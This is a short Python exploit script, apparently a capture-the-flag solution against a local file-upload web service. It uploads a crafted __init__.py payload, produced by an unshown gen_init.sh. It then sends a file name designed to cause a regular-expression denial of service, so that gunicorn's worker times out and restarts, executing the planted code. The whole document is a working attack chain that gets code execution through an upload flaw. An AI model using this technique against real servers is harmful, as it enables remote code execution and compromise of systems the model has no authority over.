#!/usr/bin/env python3
from subprocess import check_call
import requests
s = requests.session()

url = 'http://127.0.0.1:8080/'

check_call(['bash', './gen_init.sh'])

s.post(url, files={'file': ('__init__.py', open('__init__.py', 'rb').read())})

# Regular expression DoS
# gunicorn default worker timeout is 30 seconds
# When gunicorn restarts its worker, it will execute the payload in __init__.py
s.post(url, files={'file': ('a'*31 + '!', b'')})
